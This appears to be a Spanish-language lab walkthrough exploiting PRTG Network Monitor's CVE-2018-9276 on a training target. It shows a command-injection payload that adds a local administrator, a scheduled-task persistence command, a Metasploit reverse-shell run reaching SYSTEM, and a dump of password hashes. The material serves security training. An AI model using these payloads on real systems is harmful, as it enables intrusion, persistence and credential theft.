
# PTRG Network Monitor

[PRTG Network Monitor](https://www.paessler.com/prtg) es un software de monitorización de red sin agentes. Se puede utilizar para supervisar el uso del ancho de banda, el tiempo de actividad y recopilar estadísticas de varios hosts, incluidos enrutadores, conmutadores, servidores y más. La primera versión de PRTG se lanzó en 2003. En 2015 se lanzó una versión gratuita de PRTG, restringida a 100 sensores que se pueden utilizar para supervisar hasta 20 hosts.&#x20;

Funciona con un modo de detección automática para escanear áreas de una red y crear una lista de dispositivos. Una vez creada esta lista, puede recopilar más información de los dispositivos detectados mediante protocolos como ICMP, SNMP, WMI, NetFlow y más. Los dispositivos también pueden comunicarse con la herramienta a través de una API REST. El software se ejecuta completamente desde un sitio web basado en AJAX, pero hay una aplicación de escritorio disponible para Windows, Linux y macOS. Algunos datos interesantes sobre PRTG:

* Según la compañía, lo utilizan 300.000 usuarios en todo el mundo.
* La empresa que fabrica la herramienta, Paessler, ha estado creando soluciones de monitorización desde 1997
* Algunas organizaciones que utilizan PRTG para monitorear sus redes incluyen el Aeropuerto Internacional de Nápoles, Virginia Tech, 7-Eleven y [más .](https://www.paessler.com/company/casestudies)

A lo largo de los años, PRTG ha sufrido [26 vulnerabilidades](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) a las que se les asignaron CVE. De todas ellas, solo cuatro tienen PoC de explotación pública fáciles de encontrar, dos vulnerabilidades de secuencias de comandos entre sitios (XSS), una de denegación de servicio y una vulnerabilidad de inyección de comandos autenticada que trataremos en esta sección. Es raro ver a PRTG expuesto externamente, pero a menudo nos hemos encontrado con PRTG durante pruebas de penetración internas. El cuadro de lanzamiento semanal de HTB [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) muestra PRTG.

***

## <mark style="color:purple;">Discovery / Footprinting / Enumeración</mark>

Podemos descubrir PRTG rápidamente a partir de un escaneo de Nmap. Normalmente se puede encontrar en puertos web comunes como 80, 443 o 8080. Es posible cambiar el puerto de la interfaz web en la sección Configuración cuando se inicia sesión como administrador.

```shell-session
afsh4ck@kali$ sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

Desde el escaneo Nmap anterior, podemos ver el servicio `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)`detectado en el puerto 8080.

PRTG también aparece en el análisis de EyeWitness que realizamos anteriormente. Aquí podemos ver que EyeWitness enumera las credenciales predeterminadas `prtgadmin:prtgadmin`. Por lo general, se completan previamente en la página de inicio de sesión y, a menudo, las encontramos sin cambios. Los escáneres de vulnerabilidades como Nessus también tienen [complementos](https://www.tenable.com/plugins/nessus/51874) que detectan la presencia de PRTG.

![imagen](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Una vez que hayamos descubierto PRTG, podemos confirmarlo navegando a la URL y se nos presentará la página de inicio de sesión.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_login.png" alt=""><figcaption></figcaption></figure>

De la enumeración que hemos realizado hasta ahora, parece ser la versión de PRTG `17.3.33.2830`y es probable que sea vulnerable a [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) , que es una inyección de comando autenticada en la consola web del administrador del sistema de PRTG para PRTG Network Monitor anterior a la versión 18.2.39. Según la versión informada por Nmap, podemos suponer que estamos tratando con una versión vulnerable. Con `cURL` podemos ver que el número de versión es efectivamente `17.3.33.283`.

```shell-session
afsh4ck@kali$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

Nuestro primer intento de iniciar sesión con las credenciales predeterminadas falla, pero unos cuantos intentos más tarde, logramos ingresar `prtgadmin:Password123`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Vulnerabilidades conocidas</mark>

Una vez que hayamos iniciado sesión, podemos explorar un poco, pero sabemos que es probable que sea vulnerable a una falla de inyección de comandos, así que vayamos directo al grano. Esta excelente [publicación de blog](https://www.codewatch.org/blog/?p=453) de la persona que descubrió esta falla hace un gran trabajo al explicar el proceso de descubrimiento inicial y cómo la descubrieron. Al crear una nueva notificación, el campo `Parameter` se pasa directamente a un script de PowerShell sin ningún tipo de sanitización de entrada.

Para comenzar, pasa el mouse sobre la parte superior derecha `Setup` y luego al menú `Account Settings` y finalmente haz clic en `Notifications`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png" alt=""><figcaption></figcaption></figure>

A continuación, haga clic en `Add new notification`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_add.png" alt=""><figcaption></figcaption></figure>

Dale un nombre a la notificación y desplázate hacia abajo y marca la casilla junto a `EXECUTE PROGRAM`. En `Program File`, selecciona `Demo exe notification - outfile.ps1` en el menú desplegable. Finalmente, en el campo de parámetros, ingresa un comando. Para nuestros propósitos, agregaremos un nuevo usuario administrador local ingresando:

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

Durante una evaluación real, es posible que queramos hacer algo que no cambie el sistema, como obtener un reverse shell o una conexión a nuestro C2 favorito. Finalmente, haz click en el botón `Save`.

![imagen](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

Después de hacer click en `Save`, seremos redirigidos a la página `Notifications` y veremos nuestra nueva notificación nombrada `pwn` en la lista.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png" alt=""><figcaption></figcaption></figure>

Ahora, podríamos haber programado la notificación para que se ejecute (y ejecute nuestro comando) en un momento posterior al configurarla. Podríamos hacer esto con un comando cómo:

```
schtasks /create /tn "ExecuteTestTask" /tr "cmd /c echo test.txt;net user afsh4ck admin /add & net localgroup administrators afsh4ck /add" /sc once /st %time% /f
```

#### Desglose:

1. **`schtasks`**: Utilidad para programar tareas en Windows.
2. **`/tn "ExecuteTestTask"`**: Nombre de la tarea programada.
3. **`/tr "cmd /c ..."`**: Acción a ejecutar; incluye el comando con la ejecución de `cmd`.
4. **`/sc once`**: Especifica que la tarea se ejecutará una sola vez.
5. **`/st %time%`**: Hora de ejecución; ajusta la variable para que sea un minuto después de la actual.
6. **`/f`**: Sobrescribe una tarea existente si tiene el mismo nombre.

Esto podría resultar útil como mecanismo de persistencia durante un compromiso a largo plazo y vale la pena tomar nota de ello. Los horarios se pueden modificar en el menú de configuración de la cuenta si queremos configurarla para que se ejecute a una hora específica todos los días para recuperar nuestra conexión o algo por el estilo. En este punto, todo lo que queda es hacer clic en el botón `Test` para ejecutar nuestra notificación y ejecutar el comando para agregar un usuario administrador local. Después de hacer clic en `Test`, aparecerá una ventana emergente que dice `EXE notification is queued up`. Si recibimos algún tipo de mensaje de error aquí, podemos volver atrás y volver a verificar la configuración de la notificación.

Dado que se trata de una ejecución de comando a ciegas, no obtendremos ninguna respuesta, por lo que tendríamos que comprobar si nuestro receptor está conectado o, en nuestro caso, comprobar si podemos autenticarnos en el host como administrador local. Podemos usar `CrackMapExec` para confirmar el acceso de administrador local. También podríamos intentar conectarnos mediante RDP al equipo, acceder a través de WinRM o usar una herramienta como [evil-winrm](https://github.com/Hackplayers/evil-winrm) o algo del kit de herramientas [de impacket](https://github.com/SecureAuthCorp/impacket) como `wmiexec.py`o `psexec.py`.

```shell-session
afsh4ck@kali$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

¡Y confirmamos el acceso de administrador local en el objetivo! Siga el ejemplo y replique todos los pasos por su cuenta en el sistema de destino. Desafíese a aprovechar también la vulnerabilidad de inyección de comandos para obtener una conexión de shell inversa desde el objetivo.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.201.50
```

> ¿Qué versión de PRTG se está ejecutando en el objetivo?

```bash
sudo nmap -v -sV -T5 10.129.201.50

PORT      STATE    SERVICE        VERSION
80/tcp    open     http           Microsoft IIS httpd 10.0
135/tcp   open     msrpc          Microsoft Windows RPC
139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
1107/tcp  filtered isoipsigport-2
3389/tcp  open     ms-wbt-server  Microsoft Terminal Services
5985/tcp  open     http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open     ssl/http       Splunkd httpd
8080/tcp  open     http           Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
8089/tcp  open     ssl/http       Splunkd httpd
8254/tcp  filtered unknown
16018/tcp filtered unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Encontramos PRTG Monitor por el puerto `8080`. Accedemos por el navegador y nos encontramos la versión en el pie de página: `prtg 18.1.37.13946`

<figure><img src="/files/4wSZIOvDyQb2MbzjeZOd" alt=""><figcaption></figcaption></figure>

> Ataque el objetivo PRTG y obtenga ejecución remota de código. Envíe el contenido del archivo flag.txt del escritorio del administrador.

Logramos acceder  con las credenciales `prtgadmin:Password123`.

<figure><img src="/files/os5LFVZnEIpoBQWCj1hN" alt=""><figcaption></figcaption></figure>

Ahora como hemos detectado la versión `prtg 18.1.37.13946`, buscando un exploit que nos pueda servir para esta versión encontramos este repositorio de GitHub donde se explica el proceso de explotación con Metasploit:

{% embed url="<https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/http/prtg_authenticated_rce.md>" %}

Vamos a configurar las opciones del módulo y a comprobar si el objetivo es vulnerable:

```
msf6 > use exploit/windows/http/prtg_authenticated_rce

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/http/prtg_authenticated_rce) > set RHOST 10.129.201..50
msf6 exploit(windows/http/prtg_authenticated_rce) > set LHOST 10.10.15.127
msf6 exploit(windows/http/prtg_authenticated_rce) > set ADMIN_USERNAME prtgadmin
msf6 exploit(windows/http/prtg_authenticated_rce) > set ADMIN_PASSWORD Password123
msf6 exploit(windows/http/prtg_authenticated_rce) > set rport 8080
msf6 exploit(windows/http/prtg_authenticated_rce) > check
[*] 10.129.201.50:8080 - The target appears to be vulnerable.
```

En principio observamos que el objetivo es vulnerable, así que vamos a ejecutar el exploit:

```
msf6 exploit(windows/http/prtg_authenticated_rce) > run

[*] Started reverse TCP handler on 10.10.15.127:4444 
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2079)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (177734 bytes) to 10.129.201.50
[*] Meterpreter session 1 opened (10.10.15.127:4444 -> 10.129.201.50:50721) at 2025-01-27 18:32:44 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Tenemos una shell como administrador! Vamos al escritorio y obtenemos la flag:

```bash
meterpreter > cd /Users/Administrator/Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2021-08-17 05:12:04 +0000  desktop.ini
100666/rw-rw-rw-  21    fil   2021-09-29 01:45:17 +0000  flag.txt

meterpreter > cat flag.txt 
WhOs3_****************
```

Incluso como tenemos un Meterpreter como admin podemos hacer un volcado de todos los hashes de los usurios del sistema:

```
meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mrb3n:1000:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e52865c67b8793053ffebd806e74fd13:::
```
